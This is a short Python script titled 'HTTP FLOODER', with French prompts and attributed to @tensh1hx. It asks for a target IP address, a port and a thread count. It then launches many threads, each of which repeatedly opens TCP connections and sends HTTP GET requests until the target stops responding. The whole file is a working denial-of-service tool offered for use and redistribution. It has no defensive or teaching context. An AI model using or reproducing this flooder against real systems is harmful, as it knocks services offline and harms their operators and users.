import socket
import threading
import sys
import time
from sys import platform
import os
from colorama import Fore

if platform == "linux" or platform == "linux2":
    os.system('clear')
elif platform == "darwin":
    os.system('clear')
elif platform == "win32":
    os.system('CLS')

print("")
print('\033[94m' + " _   _ _____ ___________  ______ _     _____  ___________ ___________ ")
print('\033[94m' + "| | | |_   _|_   _| ___ \ |  ___| |   |  _  ||  _  |  _  \  ___| ___ \ ")
print('\033[94m' + "| |_| | | |   | | | |_/ / | |_  | |   | | | || | | | | | | |__ | |_/ /")
print('\033[94m' + "|  _  | | |   | | |  __/  |  _| | |   | | | || | | | | | |  __||    / ")
print('\033[94m' + "| | | | | |   | | | |     | |   | |___\ \_/ /\ \_/ / |/ /| |___| |\ \ ")
print('\033[94m' + "\_| |_/ \_/   \_/ \_|     \_|   \_____/\___/  \___/|___/ \____/\_| \_|")
print('\033[94m' + "                                                                      ")
print("")
print('\033[95m' + "By @tensh1hx | https://github.com/tensh1hx | You can modify or redistribute the script.")
print("")
print("")

target = input(f"{Fore.WHITE}[ {Fore.BLUE}? {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Entrez l'IP à flood:{Fore.WHITE} ")
port = input(f"{Fore.WHITE}[ {Fore.BLUE}? {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Entrez un port:{Fore.WHITE} ")
threads = input(f"{Fore.WHITE}[ {Fore.BLUE}? {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Entrez le nombre de threads à amorcer:{Fore.WHITE} ")
compteur = 0

port = int(port)
threads = int(threads)

def attaque():
    while True:
        try:
            global compteur
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            request = "GET / HTTP/1.1\r\nHost:%s\r\n\r\n" % target
            request = request.encode()
            s.sendto(request, (target, port))

            compteur += 1

            print(f"{Fore.WHITE}[ {Fore.GREEN}+ {Fore.WHITE}] {compteur} {Fore.LIGHTBLACK_EX}requêtes envoyées avec succès à '{target}' !".format(compteur, target))

            s.close
        except socket.error:
            print(f"{Fore.WHITE}[ {Fore.RED}! {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Connexion impossible! '{target}' ne répond plus.")
            socket.close
            break

for i in range(threads):
        thread = threading.Thread(target=attaque)
        thread.daemon = True
        thread.start()

while True:
    try:
        time.sleep(0.1)
    except KeyboardInterrupt:
        print(f"\n{Fore.WHITE}[ {Fore.RED}- {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Vous avez décidé d'arrêter l'attaque.")
        socket.close
        sys.exit()
